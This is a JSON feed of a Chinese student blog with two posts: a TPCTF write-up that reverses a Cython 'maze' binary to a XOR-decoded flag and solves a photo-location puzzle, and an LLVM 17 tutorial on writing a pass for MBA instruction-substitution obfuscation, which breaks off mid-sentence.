{
    "version": "https://jsonfeed.org/version/1",
    "title": "3clyの博客 • All posts by \"学习\" category",
    "description": "一只菜狗的博客",
    "home_page_url": "https://3cly.github.io",
    "items": [
        {
            "id": "https://3cly.github.io/2023/12/26/TPCTF/",
            "url": "https://3cly.github.io/2023/12/26/TPCTF/",
            "title": "llvmpass学习及指令替换",
            "date_published": "2023-12-26T07:39:34.000Z",
            "content_html": "<h1 id=\"tpctf\"><a class=\"markdownIt-Anchor\" href=\"#tpctf\">#</a> TPCTF</h1>\n<h2 id=\"maze\"><a class=\"markdownIt-Anchor\" href=\"#maze\">#</a> maze</h2>\n<p>Welcome to the world of Maze!</p>\n<p>上午 9 点下了附件解包了出了 so 文件 10 点出去帮室友忙了 下午回来发现题已经被学长拿下三血了 tql</p>\n<p>故在赛后复现一下</p>\n<pre><code>objcopy --dump-section pydata=maze.dump maze\n\npython pyinstxtractor.py maze.dump#得so文件\n</code></pre>\n<p>python 运行，附加调试 so 文件 (在_Py_Dealloc 可以断下)</p>\n<p>看出来是 cpython 逆向，重点函数先看_pyx_pymod_exec_maze</p>\n<p><img data-src=\"/images/image-20231125150951587.png\" alt=\"image-20231125150951587\"></p>\n<p>调试可来到_pyx_pw_4maze_3c29sdmU 函数</p>\n<p><img data-src=\"/images/image-20231129213516487.png\" alt=\"image-20231129213516487\"></p>\n<p>v29 是输入的长度 说明输入长度是 33</p>\n<p>(了解 python3 整数类型 PyLongObject 和 PyObject)</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNjUzNzUxODU=\">https://zhuanlan.zhihu.com/p/165375185</span></p>\n<p><code>PyObject</code>  可说是 CPython 最核心的数据结构了，在 Python 的世界里，几乎任何元素都是 PyObject 的指针（注意这里是指针，不是实际内存空间）</p>\n<p><img data-src=\"/images/image-20231201174145192.png\" alt=\"image-20231201174145192\"></p>\n<p><img data-src=\"/images/image-20231129220843758.png\" alt=\"image-20231129220843758\"></p>\n<p>_pyx_pw_4maze_5run 函数 pyx_tuple__28 打印失败</p>\n<p>回到_pyx_pw_4maze_3c29sdmU 函数 让输入长度是 33 继续调试发现</p>\n<p><img data-src=\"/images/image-20231201181822158.png\" alt=\"image-20231201181822158\"></p>\n<p>v52 是取了输入的一位 然后赋值给 once1nput (once1nput = PyLong_FromLong (v52)😉 一次取一位</p>\n<p><img data-src=\"/images/image-20231201181647688.png\" alt=\"image-20231201181647688\"></p>\n<p>发现有一个异或前一个是一次取的一个输入 后一个是已知数据</p>\n<p><img data-src=\"/images/image-20231201175837641.png\" alt=\"image-20231201175837641\"></p>\n<p>继续调试 有一个 PyObject_RichCompare 这里 v65 是比较数据</p>\n<p><img data-src=\"/images/image-20231201175926202.png\" alt=\"image-20231201175926202\"></p>\n<p><img data-src=\"/images/image-20231201182520366.png\" alt=\"image-20231201182520366\"></p>\n<p>(第四行的才是数据)</p>\n<p>逻辑大概就是异或 再对比 进行 33 次 (每一次比较若不对就会退出)</p>\n<p>TPCTF {asdasdasdasdasdasdasdasdasd (测试数据)</p>\n<p>理清逻辑后多调试几次最后会发现其实异或的是 &quot;HITPCTF&quot;</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin\">cmp</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3c</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xb</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xb</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3d</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xe</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3e</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>key <span class=\"token operator\">=</span> <span class=\"token string\">\"HITPCTF\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">33</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">cmp</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"小t的日常\"><a class=\"markdownIt-Anchor\" href=\"#小t的日常\">#</a> 小 T 的日常</h2>\n<p>题目描述本题 flag 的正则表达式为  <code>TPCTF\\\\&#123;[A-Z]+:\\\\d+\\\\&#125;</code> ，其中  <code>[A-Z]+</code>  为小 T 家楼下商店街的一元店隔壁的服装店店名， <code>\\\\d+</code>  为这家服装店的电话号码</p>\n<p>直接把图片中的地点社工出来在这儿 搜寻附近的关键词商店街里有一元店且隔壁有服装店的即可</p>\n<p><img data-src=\"/images/image-20231201191937628.png\" alt=\"image-20231201191937628\"></p>\n<p><img data-src=\"/images/image-20231201192005252.png\" alt=\"image-20231201192005252\"></p>\n<p><img data-src=\"/images/image-20231201192040083.png\" alt=\"image-20231201192040083\"></p>\n<p>(商店比较老网上没有电话 只有图片里才能看到)</p>\n<p narukiya:2311855>得出 flag 为 TPCTF</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/12/26/llvmpass%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%8C%87%E4%BB%A4%E6%9B%BF%E6%8D%A2/",
            "url": "https://3cly.github.io/2023/12/26/llvmpass%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%8C%87%E4%BB%A4%E6%9B%BF%E6%8D%A2/",
            "title": "llvmpass学习及指令替换",
            "date_published": "2023-12-26T07:39:33.000Z",
            "content_html": "<h1 id=\"llvm-pass\"><a class=\"markdownIt-Anchor\" href=\"#llvm-pass\">#</a> LLVM Pass</h1>\n<h3 id=\"llvm基础随便写写\"><a class=\"markdownIt-Anchor\" href=\"#llvm基础随便写写\">#</a> LLVM 基础 (随便写写)</h3>\n<p><strong>Compilers 编译器总体结构</strong></p>\n<ul>\n<li>\n<p>Lexical Analysis 词法分析</p>\n</li>\n<li>\n<p>Parsing 语法分析</p>\n</li>\n<li>\n<p>Semantic Analysis 语义分析 (主要)</p>\n<p><strong>---------- 前端 ----------</strong></p>\n</li>\n<li>\n<p>Optimization 优化 (主要)</p>\n<p><strong>---------- 后端 ----------</strong></p>\n</li>\n<li>\n<p>Code Generation 代码生成</p>\n</li>\n</ul>\n<p>LLVM 编译器结构如下图</p>\n<p>![image-1692164511976 (1)](/images/image-1692164511976 (1).png)</p>\n<p>优点：通用的中间表示（IR）来表示程序的结构和行为</p>\n<h3 id=\"环境配置\"><a class=\"markdownIt-Anchor\" href=\"#环境配置\">#</a> 环境配置</h3>\n<p>官方教程～～～～</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sbHZtLm9yZy9kb2NzL1dyaXRpbmdBbkxMVk1QYXNzLmh0bWw=\">https://llvm.org/docs/WritingAnLLVMPass.html</span></p>\n<p><s>一开始我还编译 llvm-project… 中途还遇到了 git clone 文件过大的问题… 果断放弃</s></p>\n<p><strong>Ubantu apt</strong></p>\n<h4 id=\"在-ubuntu-上安装-llvm-17\"><a class=\"markdownIt-Anchor\" href=\"#在-ubuntu-上安装-llvm-17\">#</a> 在 Ubuntu 上安装 LLVM 17</h4>\n<pre><code>wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | sudo apt-key add -\nsudo apt-add-repository &quot;deb http://apt.llvm.org/jammy/ llvm-toolchain-jammy-17 main&quot;\nsudo apt-get update\nsudo apt-get install -y llvm-17 llvm-17-dev llvm-17-tools clang-17\n</code></pre>\n<p><strong>这将安装所有必需的头文件、库和工具路径为  <code>/usr/lib/llvm-17/</code> 。</strong></p>\n<p>查找安装路径</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mou@mou-virtual-machine:~/桌面$ <span class=\"token builtin class-name\">cd</span> <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>mou@mou-virtual-machine:~$ <span class=\"token builtin class-name\">cd</span> /usr/include</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mou@mou-virtual-machine:/usr/include$ <span class=\"token function\">ls</span> llvm*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>llvm-17:</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>llvm</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>llvm-c-17:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>llvm-c</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mou@mou-virtual-machine:/usr/include$ <span class=\"token builtin class-name\">cd</span> <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mou@mou-virtual-machine:/usr$ <span class=\"token builtin class-name\">cd</span> lib</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>mou@mou-virtual-machine:/usr/lib$ <span class=\"token function\">ls</span> llvm-17/</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>bin  build  cmake  include  lib  share</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>mou@mou-virtual-machine:/usr/lib$</pre></td></tr></table></figure><p><strong>CMake 编译相关</strong></p>\n<p><s>使用 cmake 的 find_library</s></p>\n<p>cmake 学习之前有记录 这里就不过多赘述了</p>\n<p>apt 安装的，你让他找得到 llvm 就行 ()</p>\n<p><strong>坑</strong></p>\n<p>之前我 apt 装好 llvm 也明白了安装路径就在网上随便找了 pass 代码编译 结果按照给的命令运行后没有任何回显 问了大佬才发现复制的代码是 leagct pass 不应该是 -fpass-plugin 载入插件… 于是引出了我对新版管理器的学习…</p>\n<p>12.12 在加装一个 T 固态后先已经从 VMware 转战 WSL<img data-src=\"/images/image-20231212203609259.png\" alt=\"image-20231212203609259\"></p>\n<h3 id=\"pass\"><a class=\"markdownIt-Anchor\" href=\"#pass\">#</a> PASS</h3>\n<p><strong>LLVM Pass</strong> 框架是 LLVM 提供给用户用来干预代码优化过程的框架，编译后的 LLVM Pass 通过优化器 opt 进行加载，可以对 LLVM IR 中间代码进行分析和修改，生成新的中间代码。  在实现上，LLVM 的核心库中会给你一些 Pass 类 去继承。你需要实现它的一些方法。  最后使用 LLVM 的编译器会把它翻译得到的 IR 传入 Pass 里，给你遍历和修改。</p>\n<p>LLVM IR 实际上有三种表示：</p>\n<ol>\n<li>.ll 格式：人类可以阅读的文本。</li>\n<li>.bc 格式：适合机器存储的二进制文件。</li>\n<li>内存表示</li>\n</ol>\n<p>首先，.ll 格式和.bc 格式是如何生成并相互转换的呢？下面我列了个常用的简单指令清单：</p>\n<ul>\n<li>.c -&gt; .ll： <code>clang -emit-llvm -S a.c -o a.ll</code></li>\n<li>.c -&gt; .bc:  <code>clang -emit-llvm -c a.c -o a.bc</code></li>\n<li>.ll -&gt; .bc:  <code>llvm-as a.ll -o a.bc</code></li>\n<li>.bc -&gt; .ll:  <code>llvm-dis a.bc -o a.ll</code></li>\n<li>.bc -&gt; .s:  <code>llc a.bc -o a.s</code></li>\n</ul>\n<p>可以看到， <code>clang</code>  通过 <code>-emit-llvm</code>  参数， 使得原本要生成汇编以及机器码的指令生成了 LLVM IR 的 ll 格式和 bc 格式。 这可以理解为：对于 LLVM IR 来说，.ll 文件就相当于汇编，.bc 文件就相当于机器码。 这也是 <code>llvm-as</code>  和 <code>llvm-dis</code>  指令为什么叫 <code>as</code>  和 <code>dis</code>  的缘故。</p>\n<p>LLVM 有多种类型的 Pass 可供选择，包括：ModulePass (基于模块)、FunctionPass (基于函数)、CallGraphPass (基于调用图)、LoopPass (基于循环) 等</p>\n<p>参考学习的好👍项目:</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JhbmFjaC1zcGFjZS9sbHZtLXR1dG9y\">https://github.com/banach-space/llvm-tutor</span>  llvm-17 新版管理器</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>clang-17 <span class=\"token parameter variable\">-O1</span> -emit-llvm input.c <span class=\"token parameter variable\">-S</span> <span class=\"token parameter variable\">-o</span> out.ll  <span class=\"token comment\">#得.ll 文件</span></pre></td></tr></table></figure><figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/usr/lib/llvm-17/bin/opt -load-pass-plugin ./libHelloWorld.so <span class=\"token parameter variable\">-passes</span><span class=\"token operator\">=</span>hello-world -disable-output out.ll</pre></td></tr></table></figure><p><img data-src=\"/images/image-20231123203845145.png\" alt=\"image-20231123203845145\"></p>\n<p>一个 hello world 的 <strong>FunctionPass</strong>，基于函数的 Pass 打印函数名称和参数数量</p>\n<p>后续传 github</p>\n<h3 id=\"llvm-ir学习略\"><a class=\"markdownIt-Anchor\" href=\"#llvm-ir学习略\">#</a> LLVM IR 学习 (略)</h3>\n<p>LLVM IR 是一门低级编程语言 语法类似于汇编</p>\n<h3 id=\"cscd70\"><a class=\"markdownIt-Anchor\" href=\"#cscd70\">#</a> CSCD70</h3>\n<p>cscd70 作业可以做做</p>\n<h3 id=\"自己写pass实现ollvm之指令替代\"><a class=\"markdownIt-Anchor\" href=\"#自己写pass实现ollvm之指令替代\">#</a> 自己写 pass 实现 OLLVM 之指令替代</h3>\n<p>之前做 csapp 的 datalab 就发现算数运算存在一些恒等式，若能替换也算是一种混淆吧 后面了解 OLLVM 之后就想着自己实现一下</p>\n<p><strong>减法:a - b == (a + ~b) + 1</strong></p>\n<p><strong>加法:a + b == (((a ^ b) + 2 * (a &amp; b)) * 39 + 23) * 151 + 111</strong> (仅限 byte)</p>\n<p><em><em>异或:x^y==x-y-2</em>(x|~y)-2</em>*</p>\n<p>​        <s>1.(a|b)&amp;(<sub>a|</sub>b)</s><br>\n​        <s>2.<sub>(</sub>a&amp;<sub>b)&amp;</sub>(a&amp;b)</s><br>\n​        <s>3.(a&amp;<sub>b)|(</sub>a&amp;b)</s></p>\n<h4 id=\"mbasub\"><a class=\"markdownIt-Anchor\" href=\"#mbasub\">#</a> MBASub</h4>\n<p>混合布尔算术（Mixed Boolean-Arithmetic, MBA）是一种混淆算法，这种算法由算数运算（例如 ADD、SUB、MUL）和布尔运算（例如 AND、OR、NOT）的混合使用组成。具体参考 https://bbs.kanxue.com/thread-271574.htm (线性 MBA)</p>\n<p>PASS 注册方式有两种，一是修改 PassRegistry.def 和 PassBuilder.cpp 文件，直接追加 Pass 定义进去。第二种是用插件接口进行注册，也是我使用的方式</p>\n<p><s>解析一个能跑通的 pass 的组成部分</s></p>\n<h5 id=\"llvmgetpassplugininfo-获取相关信息\"><a class=\"markdownIt-Anchor\" href=\"#llvmgetpassplugininfo-获取相关信息\">#</a> llvmGetPassPluginInfo 获取相关信息</h5>\n<p>llvm 相关函数 google 一下有官网介绍</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//-----------------------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// New PM Registration 写 pass 套这个就行 </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//-----------------------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">extern</span> <span class=\"token string\">\"C\"</span> LLVM_ATTRIBUTE_WEAK <span class=\"token double-colon punctuation\">::</span>llvm<span class=\"token double-colon punctuation\">::</span>PassPluginLibraryInfo</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">llvmGetPassPluginInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">&#123;</span>LLVM_PLUGIN_API_VERSION<span class=\"token punctuation\">,</span> <span class=\"token string\">\"mba-sub\"</span><span class=\"token punctuation\">,</span> LLVM_VERSION_STRING<span class=\"token punctuation\">,</span><span class=\"token comment\">//llvm 版本号环境取值，第二个是插件名字，第三个是插件版本号都是随便传</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>          <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>PassBuilder <span class=\"token operator\">&amp;</span>PB<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>   <span class=\"token comment\">// 第四个参数比较重要，回调函数传递 PassBuilder &amp;PB 对象</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            PB<span class=\"token punctuation\">.</span><span class=\"token function\">registerPipelineParsingCallback</span><span class=\"token punctuation\">(</span>   </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>StringRef Name<span class=\"token punctuation\">,</span> FunctionPassManager <span class=\"token operator\">&amp;</span>FPM<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                   ArrayRef<span class=\"token operator\">&lt;</span>PassBuilder<span class=\"token double-colon punctuation\">::</span>PipelineElement<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Name <span class=\"token operator\">==</span> <span class=\"token string\">\"mba-sub\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                    FPM<span class=\"token punctuation\">.</span><span class=\"token function\">addPass</span><span class=\"token punctuation\">(</span><span class=\"token function\">MBASub</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                      <span class=\"token comment\">//FPM.addPass (MBASub ()) 这行代码向函数级别 Pass 管理器 FPM 中添加了一个 MBASub Pass 的实例。在这里，MBASub () 表示创建了 MBASub 结构体的一个实例 (默认构造函数)，并将其添加到 Pass 管理器中</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                  <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>          <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h5 id=\"passinfomixin相关\"><a class=\"markdownIt-Anchor\" href=\"#passinfomixin相关\">#</a> PassInfoMixin 相关</h5>\n<blockquote>\n<p>All LLVM passes inherit from the CRTP mix-in  <code>PassInfoMixin&lt;PassT&gt;</code> . The pass should have a  <code>run()</code>  method which returns a  <code>PreservedAnalyses</code>  and takes in some unit of IR along with an analysis manager.</p>\n</blockquote>\n<p>PassInfoMixin 模板类简化注册过程</p>\n<p>继承了 PassInfoMixin 的类我们就可以视为是一个 Pass</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//mixin 的作用是当多个组件都需要相同的数据或者某些功能的话就可以把这些内容提取出来写成一个 mixin, 虽然 C++ 没有这种特性，但通过特殊技巧实现了，暂且不管</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">MBASub</span> <span class=\"token operator\">:</span> <span class=\"token base-clause\"><span class=\"token keyword\">public</span> llvm<span class=\"token double-colon punctuation\">::</span><span class=\"token class-name\">PassInfoMixin</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">MBASub</span><span class=\"token operator\">></span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>     <span class=\"token comment\">// 定义了一个结构体 MBASub，并通过 llvm::PassInfoMixin 类来继承一些 Pass 相关的信息</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">//Pass 插件主入口点，为回调函数，会把源码的函数 IR 对象和和函数函数管理对象传递此函数</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  llvm<span class=\"token double-colon punctuation\">::</span>PreservedAnalyses <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>llvm<span class=\"token double-colon punctuation\">::</span>Function <span class=\"token operator\">&amp;</span>F<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                              llvm<span class=\"token double-colon punctuation\">::</span>FunctionAnalysisManager <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">bool</span> <span class=\"token function\">runOnBasicBlock</span><span class=\"token punctuation\">(</span>llvm<span class=\"token double-colon punctuation\">::</span>BasicBlock <span class=\"token operator\">&amp;</span>B<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">static</span> <span class=\"token keyword\">bool</span> <span class=\"token function\">isRequired</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//isRequired 是可选的，不实现则会是默认 false</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>补充 PassInfoMixin 的声明作参考</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/// A CRTP mix-in to automatically provide informational APIs needed for</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/// passes.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">///</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">/// This provides some boilerplate for types that are passes.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">template</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">typename</span> <span class=\"token class-name\">DerivedT</span><span class=\"token operator\">></span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">PassInfoMixin</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">/// Gets the name of the pass we are mixed into.</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">static</span> StringRef <span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">static_assert</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span>is_base_of<span class=\"token operator\">&lt;</span>PassInfoMixin<span class=\"token punctuation\">,</span> DerivedT<span class=\"token operator\">></span><span class=\"token double-colon punctuation\">::</span>value<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                  <span class=\"token string\">\"Must pass the derived type as the template argument!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    StringRef Name <span class=\"token operator\">=</span> <span class=\"token generic-function\"><span class=\"token function\">getTypeName</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>DerivedT<span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    Name<span class=\"token punctuation\">.</span><span class=\"token function\">consume_front</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"llvm::\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> Name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token function\">printPipeline</span><span class=\"token punctuation\">(</span>raw_ostream <span class=\"token operator\">&amp;</span>OS<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                     function_ref<span class=\"token operator\">&lt;</span><span class=\"token function\">StringRef</span><span class=\"token punctuation\">(</span>StringRef<span class=\"token punctuation\">)</span><span class=\"token operator\">></span> MapClassName2PassName<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    StringRef ClassName <span class=\"token operator\">=</span> <span class=\"token class-name\">DerivedT</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">auto</span> PassName <span class=\"token operator\">=</span> <span class=\"token function\">MapClassName2PassName</span><span class=\"token punctuation\">(</span>ClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    OS <span class=\"token operator\">&lt;&lt;</span> PassName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h5 id=\"replaceinstwithinst函数\"><a class=\"markdownIt-Anchor\" href=\"#replaceinstwithinst函数\">#</a> ReplaceInstWithInst 函数</h5>\n<pre><code class=\"language-c++\">void \tllvm::ReplaceInstWithInst (BasicBlock *BB, BasicBlock::iterator &amp;BI, Instruction *I)\n \tReplace the instruction specified by BI with the instruction 